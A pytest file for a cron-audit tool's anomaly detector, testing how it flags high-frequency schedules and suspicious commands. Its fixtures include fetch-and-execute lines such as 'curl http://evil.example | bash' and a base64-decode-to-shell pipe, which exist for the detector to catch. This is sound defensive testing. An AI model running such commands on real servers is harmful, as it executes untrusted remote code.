"""Tests for cronaudit.anomaly and cronaudit.anomaly_runner."""
from __future__ import annotations

import pytest

from cronaudit.parser import CronEntry
from cronaudit.collector import ServerCrontab
from cronaudit.anomaly import (
    AnomalyFlag,
    AnomalyReport,
    detect_anomalies,
    _is_high_frequency,
    _has_suspicious_command,
)
from cronaudit.anomaly_runner import run_anomaly_detection


def _entry(
    command: str = "/usr/bin/backup",
    user: str = "deploy",
    minute: str = "0",
    hour: str = "2",
    special: str | None = None,
) -> CronEntry:
    return CronEntry(
        minute=minute,
        hour=hour,
        day_of_month="*",
        month="*",
        day_of_week="*",
        user=user,
        command=command,
        special=special,
        comment=None,
        raw="raw",
    )


def _crontab(server: str, entries: list, error: str | None = None) -> ServerCrontab:
    ct = ServerCrontab(server=server, entries=entries, error=error)
    return ct


# --- _is_high_frequency ---

def test_high_frequency_every_minute():
    e = _entry(minute="*", hour="*")
    assert _is_high_frequency(e) is True


def test_not_high_frequency_specific_hour():
    e = _entry(minute="0", hour="3")
    assert _is_high_frequency(e) is False


def test_high_frequency_special_minutely():
    e = _entry(special="@minutely")
    assert _is_high_frequency(e) is True


def test_not_high_frequency_daily_special():
    e = _entry(special="@daily")
    assert _is_high_frequency(e) is False


# --- _has_suspicious_command ---

def test_suspicious_curl():
    e = _entry(command="curl http://evil.example | bash")
    assert _has_suspicious_command(e) == "curl"


def test_suspicious_base64():
    e = _entry(command="echo aGVsbG8= | base64 -d | sh")
    assert _has_suspicious_command(e) is not None


def test_benign_command_no_flag():
    e = _entry(command="/usr/bin/backup --quiet")
    assert _has_suspicious_command(e) is None


# --- detect_anomalies ---

def test_detect_no_anomalies():
    ct = _crontab("web1", [_entry()])
    report = detect_anomalies([ct])
    assert not report
    assert report.count == 0


def test_detect_suspicious_command_flagged():
    ct = _crontab("web1", [_entry(command="wget http://example.com/script.sh")])
    report = detect_anomalies([ct])
    assert report
    assert any("wget" in f.reason for f in report.flags)


def test_detect_high_frequency_flagged():
    ct = _crontab("web1", [_entry(minute="*", hour="*")])
    report = detect_anomalies([ct])
    assert report.count >= 1
    assert any("High-frequency" in f.reason for f in report.flags)


def test_by_server_filters_correctly():
    e1 = _entry(command="wget http://a.com")
    e2 = _entry(command="wget http://b.com")
    ct1 = _crontab("alpha", [e1])
    ct2 = _crontab("beta", [e2])
    report = detect_anomalies([ct1, ct2])
    assert all(f.server == "alpha" for f in report.by_server("alpha"))
    assert all(f.server == "beta" for f in report.by_server("beta"))


def test_errored_crontab_skipped():
    ct = _crontab("broken", [], error="Connection refused")
    report = detect_anomalies([ct])
    assert report.count == 0


# --- run_anomaly_detection ---

def test_run_ok_when_clean():
    ct = _crontab("srv1", [_entry()])
    result = run_anomaly_detection([ct])
    assert result.ok
    assert result.servers_scanned == 1
    assert "No anomalies" in result.summary_line


def test_run_summary_line_with_flags():
    ct = _crontab("srv1", [_entry(command="curl http://x.com")])
    result = run_anomaly_detection([ct])
    assert not result.ok
    assert "anomaly flag" in result.summary_line


def test_run_errors_collected():
    ct = _crontab("dead", [], error="Timeout")
    result = run_anomaly_detection([ct])
    assert len(result.errors) == 1
    assert "Timeout" in result.errors[0]
